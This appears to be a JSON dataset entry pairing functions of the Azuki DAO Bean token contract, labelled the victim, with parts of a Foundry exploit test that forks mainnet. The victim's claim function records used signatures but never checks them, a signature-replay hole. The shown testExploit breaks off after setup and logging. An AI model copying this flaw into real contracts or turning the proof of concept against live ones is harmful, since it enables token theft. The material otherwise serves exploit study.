[
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "    function claim(\n        address[] memory _contracts,      // NFT contracts: azuki + beanz + elementals\n        uint256[] memory _amounts,        // token amount for every contract: 2 + 3 + 1\n        uint256[] memory _tokenIds,       // all token id, tokenIds.length = sum(amounts)\n        uint256 _claimAmount,\n        uint256 _endTime,\n        bytes memory _signature          // sender + contracts + tokenIds + claimAmount + endTime\n    ) external whenNotPaused nonReentrant {\n        // check length\n        require(_contracts.length == _amounts.length, \"contracts length not match amounts length\");\n\n        // check contracts\n        for (uint256 i = 0; i < _contracts.length; i++) {\n            require(contractSupports[_contracts[i]], \"contract not support\");\n        }\n\n        uint256 totalAmount;\n        for (uint256 j = 0; j < _amounts.length; j++) {\n            totalAmount = totalAmount + _amounts[j];\n        }\n        require(totalAmount == _tokenIds.length, \"total amount not match tokenId length\");\n\n        // check signature\n        bytes32 message = keccak256(abi.encodePacked(msg.sender, _contracts, _tokenIds, _claimAmount, _endTime));\n        require(signatureManager == message.toEthSignedMessageHash().recover(_signature), \"invalid signature\");\n        require(block.timestamp <= _endTime, \"signature expired\");\n\n        // check NFT\n        uint256 endIndex;\n        uint256 startIndex;\n        for (uint256 i = 0; i < _amounts.length; i++) {\n\n            endIndex = startIndex + _amounts[i];\n\n            for (uint256 j = startIndex; j < endIndex; j++) {\n                address contractAddr = _contracts[i];\n                uint256 tokenId = _tokenIds[j];\n                require(IERC721(contractAddr).ownerOf(tokenId) == msg.sender, \"not owner\");\n                tokenClaimed[contractAddr][tokenId] = true;\n            }\n            startIndex = endIndex;\n        }\n        signatureClaimed[_signature] = true;\n        // transfer token\n        _transfer(address(this), msg.sender, _claimAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBean",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(address _receiver, address _token, bool _isETH) external onlyOwner {\n        if (_isETH) {\n            payable(_receiver).transfer(address(this).balance);\n        } else {\n            IERC20(_token).transfer(_receiver, IERC20(_token).balanceOf(address(this)));\n        }\n    }\n\n}\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_593_308);\n        cheats.label(address(AZUKI), \"AZUKI\");\n        cheats.label(address(Bean), \"Bean\");\n        cheats.label(Elemental, \"Elemental\");\n        cheats.label(Beanz, \"Beanz\");\n        cheats.label(azukiDAOExploiter, \"Azuki DAO Exploiter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AzukiTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(Bean), azukiDAOExploiter, 0);\n        emit log_named_decimal_uint(\n            \"Attacker balance of Bean token before exploit\", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()\n        );\n",
    "description": ""
  }
]